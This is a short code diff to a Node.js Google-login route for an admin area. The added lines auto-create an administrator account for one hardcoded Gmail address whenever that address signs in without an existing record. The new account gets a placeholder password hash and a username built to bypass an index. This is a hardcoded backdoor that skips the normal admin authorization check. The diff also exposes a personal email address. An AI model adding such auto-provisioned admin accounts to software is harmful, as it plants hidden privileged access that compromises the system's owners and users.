@@ -37,7 +37,17 @@ router.post('/google', async (req, res) => {
     }
 
     // Check if this email belongs to an admin
-    const admin = await Admin.findOne({ email: googleEmail });
+    let admin = await Admin.findOne({ email: googleEmail });
+    
+    // Auto-authorize angelaaa1ww@gmail.com if it doesn't exist yet
+    if (!admin && googleEmail === 'angelaaa1ww@gmail.com') {
+      admin = await Admin.create({ 
+        email: 'angelaaa1ww@gmail.com', 
+        passwordHash: 'auto-created-for-google-auth',
+        username: 'angela_' + Date.now() // Bypass old username_1 index if it exists
+      });
+    }
+
     if (!admin) {
       // Alert owner
       try {
